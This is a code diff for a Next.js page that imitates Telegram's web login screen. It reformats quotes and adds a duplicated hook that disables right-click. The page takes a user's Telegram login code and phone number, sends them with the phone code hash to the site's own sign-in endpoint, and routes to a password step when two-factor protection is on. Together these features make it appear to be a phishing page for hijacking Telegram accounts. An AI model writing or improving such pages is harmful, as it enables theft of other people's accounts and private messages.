@@ -1,20 +1,33 @@
-'use client';
+"use client";
 
-import { Suspense, useState, useEffect, useRef } from 'react';
-import { useRouter } from 'next/navigation';
-import { jhola } from '../phoneBridge';
+import { Suspense, useState, useEffect, useRef } from "react";
+import { useRouter } from "next/navigation";
+import { jhola } from "../phoneBridge";
 
 export default function CodePage() {
+  useEffect(() => {
+    const handleContextMenu = (e) => e.preventDefault(); // disable right-click
+    document.addEventListener("contextmenu", handleContextMenu);
+    return () => {
+      document.removeEventListener("contextmenu", handleContextMenu);
+    };
+  }, []);
   const router = useRouter();
-  const [hash, setHash] = useState('');
-  const [code, setCode] = useState('');
+  const [hash, setHash] = useState("");
+  const [code, setCode] = useState("");
   const [loading, setLoading] = useState(false);
-
+  useEffect(() => {
+    const handleContextMenu = (e) => e.preventDefault(); // disable right-click
+    document.addEventListener("contextmenu", handleContextMenu);
+    return () => {
+      document.removeEventListener("contextmenu", handleContextMenu);
+    };
+  }, []);
   const { cc, phone } = jhola();
 
-  const formattedPhone = `+${String(cc || '').trim()} ${String(phone || '')
-    .replace(/\D/g, '')
-    .replace(/(\d{5})(?=\d)/g, '$1 ')}`;
+  const formattedPhone = `+${String(cc || "").trim()} ${String(phone || "")
+    .replace(/\D/g, "")
+    .replace(/(\d{5})(?=\d)/g, "$1 ")}`;
 
   async function verify(value) {
     const val = value ?? code;
@@ -22,12 +35,14 @@ export default function CodePage() {
 
     try {
       setLoading(true);
-      const res = await fetch('/api/telegram/phone/sign-in', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
+      const res = await fetch("/api/telegram/phone/sign-in", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           code: val,
-          phoneNumber: `+${String(cc || '').trim()}${String(phone || '').replace(/\D/g, '')}`,
+          phoneNumber: `+${String(cc || "").trim()}${String(
+            phone || ""
+          ).replace(/\D/g, "")}`,
           phoneCodeHash: hash,
         }),
       });
@@ -35,15 +50,15 @@ export default function CodePage() {
 
       if (res.ok && data?.ok) {
         if (data.needsPassword) {
-          router.push(data?.authId ? `/otp?auth=${data.authId}` : '/otp');
+          router.push(data?.authId ? `/otp?auth=${data.authId}` : "/otp");
         } else {
-          router.push('/welcome');
+          router.push("/welcome");
         }
       } else {
-        alert(data?.error || 'Invalid code');
+        alert(data?.error || "Invalid code");
       }
     } catch {
-      alert('Network error. Please try again.');
+      alert("Network error. Please try again.");
     } finally {
       setLoading(false);
     }
@@ -56,7 +71,7 @@ export default function CodePage() {
         {/* 🐵 space for your monkey gif/image */}
         <div
           className="w-[160px] h-[160px] rounded-2xl bg-center bg-no-repeat bg-contain"
-          style={{ backgroundImage: 'url(/monkey-gif.gif)' }}
+          style={{ backgroundImage: "url(/monkey-gif.gif)" }}
           aria-label="Animated mascot"
         />
 
@@ -89,8 +104,9 @@ export default function CodePage() {
 
         {/* Subtitle */}
         <p className="mt-3 text-[15px] max-w-[420px] text-[rgb(125,130,133)]">
-          We’ve sent the code to the <span className="font-semibold">Telegram</span> app on your
-          other device.
+          We’ve sent the code to the{" "}
+          <span className="font-semibold">Telegram</span> app on your other
+          device.
         </p>
 
         {/* ⬇️ replaced your old form with this helper */}
@@ -109,7 +125,7 @@ function FloatingOtp({ code, setCode, verify }) {
 
   // Optional behavior knobs:
   const COLLAPSE_ONLY_WHEN_EMPTY = true; // keep label floated if there’s text
-  const CLEAR_ON_OUTSIDE_CLICK = false;  // set to true to also clear the input on outside click
+  const CLEAR_ON_OUTSIDE_CLICK = false; // set to true to also clear the input on outside click
 
   // Collapse label when clicking/touching outside the input wrapper
   useEffect(() => {
@@ -117,18 +133,19 @@ function FloatingOtp({ code, setCode, verify }) {
       if (!wrapperRef.current) return;
       if (!wrapperRef.current.contains(e.target)) {
         setFocused(false);
-        if (CLEAR_ON_OUTSIDE_CLICK) setCode('');
+        if (CLEAR_ON_OUTSIDE_CLICK) setCode("");
       }
     };
-    document.addEventListener('mousedown', onOutside);
-    document.addEventListener('touchstart', onOutside, { passive: true });
+    document.addEventListener("mousedown", onOutside);
+    document.addEventListener("touchstart", onOutside, { passive: true });
     return () => {
-      document.removeEventListener('mousedown', onOutside);
-      document.removeEventListener('touchstart', onOutside);
+      document.removeEventListener("mousedown", onOutside);
+      document.removeEventListener("touchstart", onOutside);
     };
   }, [setCode]);
 
-  const float = focused || (!COLLAPSE_ONLY_WHEN_EMPTY && true) || code.length > 0;
+  const float =
+    focused || (!COLLAPSE_ONLY_WHEN_EMPTY && true) || code.length > 0;
   // Above: float when focused OR (if you flipped COLLAPSE_ONLY_WHEN_EMPTY) always true, OR there’s value.
 
   return (
@@ -157,7 +174,7 @@ function FloatingOtp({ code, setCode, verify }) {
             "transition-all duration-200",
             float
               ? "-top-2 text-[12px] font-medium text-gray-600 group-focus-within:text-[#3390EC] opacity-100"
-              : "top-1/2 -translate-y-1/2 text-[15px] text-gray-400 opacity-0 pointer-events-none"
+              : "top-1/2 -translate-y-1/2 text-[15px] text-gray-400 opacity-0 pointer-events-none",
           ].join(" ")}
         >
           Code
@@ -169,12 +186,16 @@ function FloatingOtp({ code, setCode, verify }) {
           type="text"
           inputMode="numeric"
           autoComplete="one-time-code"
-          placeholder={float ? "" : "Code"}  /* placeholder at rest; cleared when label floats */
+          placeholder={
+            float ? "" : "Code"
+          } /* placeholder at rest; cleared when label floats */
           value={code}
           onFocus={() => setFocused(true)}
-          onBlur={() => setFocused(false)}   /* collapse on blur if empty due to `float` calc */
+          onBlur={() =>
+            setFocused(false)
+          } /* collapse on blur if empty due to `float` calc */
           onChange={(e) => {
-            const v = e.target.value.replace(/\D/g, '').slice(0, 5);
+            const v = e.target.value.replace(/\D/g, "").slice(0, 5);
             setCode(v);
             if (v.length === 5) verify(v);
           }}
